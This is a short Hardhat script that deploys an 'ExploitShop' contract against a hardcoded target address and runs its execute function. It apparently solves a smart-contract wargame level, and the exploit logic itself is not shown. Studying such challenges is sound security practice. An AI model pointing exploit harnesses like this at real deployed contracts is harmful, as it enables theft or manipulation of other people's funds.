import { ethers } from 'hardhat'
import { ExploitShop } from '../types/typechain/ExploitShop'

async function main() {
  const targetAddr = '0xef4D1404581583A9999fB675cbd1e1dbf28F406e'

  const factory = await ethers.getContractFactory('ExploitShop')
  const exploit = (await factory.deploy(targetAddr)) as ExploitShop

  console.log('Deploying contract...')
  await exploit.deployed()
  console.log(exploit.address)
  console.log('Contract deployed, executing exploit...')
  await exploit.execute({ gasLimit: 800000 })
  console.log('Exploit executed successfully ᕦ(ò_óˇ)ᕤ')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
